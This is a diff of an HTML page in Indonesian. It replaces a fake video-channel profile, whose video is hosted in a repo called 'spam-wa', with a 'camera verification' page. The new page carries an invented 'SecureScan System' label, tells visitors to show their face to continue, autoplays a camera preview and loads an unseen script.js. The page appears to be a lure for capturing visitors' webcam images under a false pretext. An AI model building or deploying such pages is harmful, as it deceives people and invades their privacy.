@@ -1,123 +1,105 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>tokyo lagi</title>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
-    <style>
-        /* Global Styles */
-        body {
-            font-family: 'Arial', sans-serif;
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            background-color: #f9f9f9;
-            color: #333;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            text-align: center;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifikasi Kamera</title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #f5f7fa, #c3cfe2);
+      color: #333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
 
-        /* Container untuk Profil */
-        .profile-container {
-            text-align: center;
-            margin-top: 20px;
-            background-color: #fff;
-            width: 80%;
-            max-width: 640px;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
-        }
+    .scan-card {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+      padding: 30px;
+      max-width: 380px;
+      width: 90%;
+      text-align: center;
+      transition: all 0.3s ease;
+    }
 
-        .profile-container img {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            margin-bottom: 10px;
-            border: 3px solid #ff5c5c;
-        }
+    .scan-card:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 10px 26px rgba(0,0,0,0.12);
+    }
 
-        .profile-container h2 {
-            font-size: 22px; /* Lebih kecil */
-            color: #333;
-            margin-bottom: 10px;
-        }
+    .scan-icon {
+      background: #007bff15;
+      color: #007bff;
+      border-radius: 50%;
+      width: 90px;
+      height: 90px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 15px;
+      font-size: 38px;
+    }
 
-        .profile-container .stats {
-            display: flex;
-            justify-content: center;
-            gap: 40px;
-            font-size: 16px;
-            color: #666;
-        }
+    h2 {
+      font-size: 22px;
+      margin-bottom: 8px;
+    }
 
-        .stats div i {
-            margin-right: 5px;
-        }
+    p {
+      font-size: 15px;
+      color: #666;
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
 
-        /* Video Container */
-        .video-container {
-            position: relative;
-            width: 100%;
-            max-width: 640px;
-            margin-top: 40px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-        }
+    .video-preview {
+      background: #000;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    }
 
-        video {
-            width: 100%;
-            height: 300px; /* Lebih kecil */
-            border-radius: 10px;
-        }
+    video {
+      width: 100%;
+      height: 230px;
+      object-fit: cover;
+      border-radius: 12px;
+    }
 
-        /* Judul Video */
-        .video-title {
-            font-size: 16px; /* Lebih kecil */
-            font-weight: 500;
-            color: #333;
-            margin-top: 10px;
-            margin-bottom: 20px;
-        }
-
-        /* Footer */
-        footer {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            background-color: #222;
-            color: #fff;
-            text-align: center;
-            padding: 10px;
-        }
-    </style>
+    footer {
+      position: fixed;
+      bottom: 10px;
+      left: 0;
+      width: 100%;
+      text-align: center;
+      color: #999;
+      font-size: 13px;
+    }
+  </style>
 </head>
 <body>
 
-    <!-- Profil Channel -->
-    <div class="profile-container">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTWy7Kab6xI-IJ6_f5ZBMevPiwxJgzGuQPLMKj6jIkkFbpDcjE9Cc6OPwSd&s=10" alt="Profile Picture">
-        <h2>tokyolagi</h2>
-        <div class="stats">
-            <div><i class="fas fa-users"></i> Followers: 1,230</div>
-            <div><i class="fas fa-thumbs-up"></i> Likes: 5,340</div>
-        </div>
+  <div class="scan-card">
+    <div class="scan-icon">
+      <i class="fa-solid fa-camera"></i>
     </div>
-
-    <!-- Video -->
-    <div class="video-container">
-        <video id="mainVideo" controls autoplay>
-            <source src="https://github.com/mrxx58/spam-wa/raw/refs/heads/main/Sunuva%20Swimwear%20_%20Girls%20Swimwear%20SS22.mp4" type="video/mp4">
-        </video>
-        <h1 class="video-title" id="videoTitle">vidio tokyo terbaru</h1>
+    <h2>Verifikasi Kamera</h2>
+    <p>Pastikan wajah Anda terlihat jelas untuk melanjutkan proses verifikasi.</p>
+    <div class="video-preview">
+      <video id="cameraPreview" autoplay muted playsinline></video>
     </div>
+  </div>
 
-   <script src="script.js"></script>
+  <footer>© 2025 SecureScan System</footer>
+
+  <!-- Script terpisah -->
+  <script src="script.js"></script>
 
 </body>
 </html>
